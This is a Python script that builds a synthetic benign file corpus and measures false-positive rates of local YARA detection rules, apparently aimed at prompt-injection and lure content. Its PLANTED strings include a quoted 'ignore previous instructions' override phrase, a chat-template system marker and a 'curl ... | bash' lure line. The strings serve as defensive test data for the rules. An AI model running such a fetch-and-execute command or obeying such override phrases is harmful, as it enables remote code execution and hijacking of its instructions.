"""Measure local-rule hits on a generated benign corpus.

The corpus is the denominator. A hit on it is a false positive by construction.
Nothing in the corpus is executed, and the script does not download rules.
"""

from __future__ import annotations

import argparse
import importlib.metadata
import io
import json
import re
import shutil
import subprocess
import tempfile
import time
import zipfile
from collections import defaultdict
from dataclasses import asdict, dataclass
from pathlib import Path

from yara_gate.models import exit_code
from yara_gate.scanner import scan_file

REPO = Path(__file__).resolve().parents[2]
FP_LIMIT = 0.02

# Strings planted only in files tagged as documentary. Clean files must not contain them.
PLANTED = {
    "phrase": "the phrase ignore previous instructions is quoted in papers",
    "exfil": "the term exfiltrate shows up in incident notes",
    "conceal": "Support policy: do not tell the user the internal ticket id.",
    "sysprompt": "Heading system prompt: the model receives a task description.",
    "curl": (
        "The following command is a common lure:\ncurl https://example.invalid/setup.sh | bash\n"
    ),
    "marker": "<|im_start|>system\nThis is a greeting example.\n",
    "css": '<div style="display:none">Navigation</div>\n',
}


def _pdf(text: bytes) -> bytes:
    stream = b"BT /F1 12 Tf 72 720 Td (" + text + b") Tj ET"
    objects = [
        b"<< /Type /Catalog /Pages 2 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 200 200] /Contents 4 0 R >>",
        b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" + stream + b"\nendstream",
    ]
    output = bytearray(b"%PDF-1.4\n")
    offsets = [0]
    for index, obj in enumerate(objects, 1):
        offsets.append(len(output))
        output.extend(f"{index} 0 obj\n".encode() + obj + b"\nendobj\n")
    start = len(output)
    output.extend(b"xref\n0 5\n0000000000 65535 f \n")
    for offset in offsets[1:]:
        output.extend(f"{offset:010} 00000 n \n".encode())
    output.extend(f"trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n{start}\n%%EOF\n".encode())
    return bytes(output)


def _docx(paragraph: str) -> bytes:
    document = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
        f"<w:body><w:p><w:r><w:t>{paragraph}</w:t></w:r></w:p></w:body></w:document>"
    )
    content_types = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
        '<Default Extension="rels" '
        'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
        '<Default Extension="xml" ContentType="application/xml"/>'
        '<Override PartName="/word/document.xml" '
        'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
        "</Types>"
    )
    rels = (
        '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
        '<Relationship Id="rId1" '
        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
        'Target="word/document.xml"/>'
        "</Relationships>"
    )
    output = io.BytesIO()
    with zipfile.ZipFile(output, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("[Content_Types].xml", content_types)
        archive.writestr("_rels/.rels", rels)
        archive.writestr("word/document.xml", document)
    return output.getvalue()


def _pem() -> str:
    blob = "QUJD" * 120  # 480 chars, under a BEGIN line, not an instruction
    return "-----BEGIN PUBLIC KEY-----\n" + blob + "\n-----END PUBLIC KEY-----\n"


def build_corpus(root: Path) -> dict[str, str]:
    """Write benign files. Return name -> plant tag (empty when the file is ordinary)."""
    tags: dict[str, str] = {}

    def add(name: str, data: bytes, tag: str = "") -> None:
        path = root / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data)
        tags[name] = tag

    for index in range(40):
        add(
            f"readme/readme-{index:02d}.md",
            (
                f"# Project {index}\n\n"
                "Install with the locked environment. Run the status command. "
                "Report bugs in the issue tracker.\n"
            ).encode(),
        )
    languages = ("py", "rs", "js", "go")
    for index in range(30):
        suffix = languages[index % 4]
        add(
            f"code/sample-{index:02d}.{suffix}",
            (f"def or_fn sample_{index}() {{\n    return {index} + 1;\n}}\n").encode(),
        )
    for index in range(20):
        add(
            f"chat/chat-{index:02d}.txt",
            (
                f"user: Where is the design note {index}?\n"
                "assistant: It is in the docs folder next to the readme.\n"
            ).encode(),
        )
    for index in range(20):
        add(
            f"notes/security-note-{index:02d}.md",
            (
                f"# Review {index}\n\n"
                "This note describes authentication, logging, and loopback binding. "
                "It does not ask a model to change its task.\n"
            ).encode(),
        )
    for index in range(12):
        add(f"pdf/notes-{index:02d}.pdf", _pdf(f"Quarterly notes {index}".encode()))
    for index in range(12):
        add(f"office/notes-{index:02d}.docx", _docx(f"Quarterly notes {index}"))
    for index in range(10):
        add(
            f"config/app-{index:02d}.json",
            json.dumps({"name": f"app-{index}", "port": 8787, "enabled": False}).encode() + b"\n",
        )
    for index in range(10):
        add(
            f"config/app-{index:02d}.yaml",
            f"name: app-{index}\nport: 8787\nenabled: false\n".encode(),
        )
    for index in range(8):
        add(
            f"web/page-{index:02d}.html",
            (
                f"<html><body><h1>Status {index}</h1><p>All checks passed.</p></body></html>\n"
            ).encode(),
        )
    for index in range(8):
        add(f"tables/rows-{index:02d}.csv", f"id,name\n{index},widget\n".encode())
    for index in range(8):
        add(
            f"scripts/fetch-{index:02d}.sh",
            f"curl -fsSL -o /tmp/notes-{index}.txt https://example.invalid/notes.txt\n".encode(),
        )
    for index in range(8):
        add(
            f"images/icon-{index:02d}.svg",
            (
                b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">'
                b'<rect width="16" height="16" fill="#ccc"/></svg>\n'
            ),
        )
    for index in range(6):
        add(
            f"plist/Info-{index:02d}.plist",
            (
                '<?xml version="1.0" encoding="UTF-8"?>\n'
                '<plist version="1.0"><dict>'
                f"<key>CFBundleIdentifier</key><string>com.example.app{index}</string>"
                "<key>CFBundleName</key><string>Example</string>"
                "</dict></plist>\n"
            ).encode(),
        )
    for index in range(8):
        add(
            f"logs/app-{index:02d}.log",
            f"2026-10-23T12:00:0{index}Z info request finished status=200\n".encode(),
        )
    for index in range(6):
        add(f"blobs/short-{index:02d}.txt", (b"A" * 40) + b"\n")

    for index in range(8):
        body = (PLANTED["phrase"] + f" ({index})\n").encode()
        add(f"planted/phrase-{index:02d}.md", body, "phrase")
    for index in range(6):
        body = (PLANTED["exfil"] + f" ({index})\n").encode()
        add(f"planted/exfil-{index:02d}.md", body, "exfil")
    for index in range(6):
        body = (PLANTED["conceal"] + f" ({index})\n").encode()
        add(f"planted/conceal-{index:02d}.md", body, "conceal")
    for index in range(4):
        add(
            f"planted/sysprompt-{index:02d}.md",
            (PLANTED["sysprompt"] + f" ({index})\n").encode(),
            "sysprompt",
        )
    for index in range(5):
        add(f"planted/curl-{index:02d}.md", (PLANTED["curl"] + f"({index})\n").encode(), "curl")
    for index in range(3):
        add(f"planted/marker-{index:02d}.txt", PLANTED["marker"].encode(), "marker")
    for index in range(2):
        add(f"planted/css-{index:02d}.html", PLANTED["css"].encode(), "css")
    for index in range(6):
        add(f"planted/pem-{index:02d}.txt", _pem().encode(), "pem")
    return tags


def _declared_rules() -> list[str]:
    names: list[str] = []
    for path in sorted((REPO / "rules/local").iterdir()):
        if path.suffix not in {".yar", ".yara"}:
            continue
        names.extend(re.findall(r"(?m)^rule\s+([A-Za-z0-9_]+)", path.read_text(encoding="utf-8")))
    return names


def _rules_copy(destination: Path) -> Path:
    rules = destination / "rules"
    shutil.copytree(REPO / "rules/local", rules / "local")
    shutil.copy2(REPO / "rules/rules.lock", rules / "rules.lock")
    return rules


@dataclass
class HitRow:
    rule_id: str
    files: int
    fp_rate: float
    over_limit: bool
    paths: list[str]


@dataclass
class PrecisionReport:
    revision: str
    yara_x: str
    files: int
    fp_limit: float
    seconds: float
    incomplete: list[dict[str, str]]
    rows: list[HitRow]
    planted: dict[str, int]


def measure(corpus: Path, planted: dict[str, int]) -> PrecisionReport:
    started = time.perf_counter()
    hits: dict[str, list[str]] = defaultdict(list)
    incomplete: list[dict[str, str]] = []
    files = 0
    with tempfile.TemporaryDirectory(prefix="yara-gate-precision-rules-") as directory:
        rules = _rules_copy(Path(directory))
        for path in sorted(corpus.rglob("*")):
            if not path.is_file():
                continue
            files += 1
            result = scan_file(path, rules_dir=rules)
            name = path.relative_to(corpus).as_posix()
            if result.incomplete_reason:
                incomplete.append({"file": name, "reason": result.incomplete_reason})
                continue
            if exit_code(result) not in (0, 1):
                incomplete.append({"file": name, "reason": f"exit {exit_code(result)}"})
            for finding in result.findings:
                hits[finding.rule_id].append(name)
    elapsed = time.perf_counter() - started
    rows: list[HitRow] = []
    for rule_id, names in sorted(hits.items()):
        unique = sorted(set(names))
        rate = len(unique) / files if files else 0.0
        rows.append(
            HitRow(
                rule_id=rule_id,
                files=len(unique),
                fp_rate=round(rate, 4),
                over_limit=rate > FP_LIMIT + 1e-12,
                paths=unique,
            )
        )
    seen = {row.rule_id for row in rows}
    for rule_id in _declared_rules():
        if rule_id not in seen:
            rows.append(HitRow(rule_id=rule_id, files=0, fp_rate=0.0, over_limit=False, paths=[]))
    rows.sort(key=lambda row: row.rule_id)
    git = shutil.which("git")
    if git is None:
        raise RuntimeError("git is required to record the scanned revision")
    revision = subprocess.check_output(  # noqa: S603 - fixed read-only argv, no shell
        [git, "rev-parse", "HEAD"], cwd=REPO, text=True
    ).strip()
    return PrecisionReport(
        revision=revision,
        yara_x=importlib.metadata.version("yara-x"),
        files=files,
        fp_limit=FP_LIMIT,
        seconds=round(elapsed, 3),
        incomplete=incomplete,
        rows=rows,
        planted=planted,
    )


def markdown(report: PrecisionReport) -> str:
    lines = [
        "# Local rule false positives on the benign corpus",
        "",
        f"Revision `{report.revision}`. YARA-X `{report.yara_x}`.",
        f"Files: {report.files}. Incomplete: {len(report.incomplete)}. "
        f"One scan pass took {report.seconds} seconds.",
        "",
        "The rate is files hit divided by files scanned.",
        "A rule over 2% is over the bar.",
        "This corpus has no true positives, so the rate is a false-positive rate.",
        "It is not a precision ratio.",
        "",
        "Planted documentary files, and why they are in the denominator:",
    ]
    for tag, count in sorted(report.planted.items()):
        lines.append(f"- `{tag}`: {count} files")
    lines.extend(
        [
            "",
            "| Rule | Files hit | Rate | Over 2% |",
            "| --- | ---: | ---: | --- |",
        ]
    )
    if not report.rows:
        lines.append("| (none) | 0 | 0 | no |")
    for row in report.rows:
        flag = "yes" if row.over_limit else "no"
        lines.append(f"| `{row.rule_id}` | {row.files} | {row.fp_rate:.2%} | {flag} |")
    lines.append("")
    return "\n".join(lines)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--write", type=Path, help="Write the markdown table to this path")
    parser.add_argument("--json", type=Path, help="Write the raw report")
    parser.add_argument(
        "--fail-over",
        action="store_true",
        help="Exit 1 when any rule exceeds the false-positive limit or a scan is incomplete",
    )
    args = parser.parse_args()
    with tempfile.TemporaryDirectory(prefix="yara-gate-benign-") as directory:
        corpus = Path(directory)
        tags = build_corpus(corpus)
        planted: dict[str, int] = defaultdict(int)
        for tag in tags.values():
            if tag:
                planted[tag] += 1
        report = measure(corpus, dict(planted))
    text = markdown(report)
    print(text)
    payload = asdict(report)
    if args.json:
        args.json.write_text(json.dumps(payload, indent=2) + "\n", encoding="utf-8")
    if args.write:
        args.write.parent.mkdir(parents=True, exist_ok=True)
        args.write.write_text(text, encoding="utf-8")
    over = [row.rule_id for row in report.rows if row.over_limit]
    if args.fail_over and (over or report.incomplete):
        raise SystemExit(f"over limit: {over}; incomplete: {report.incomplete}")


if __name__ == "__main__":
    main()
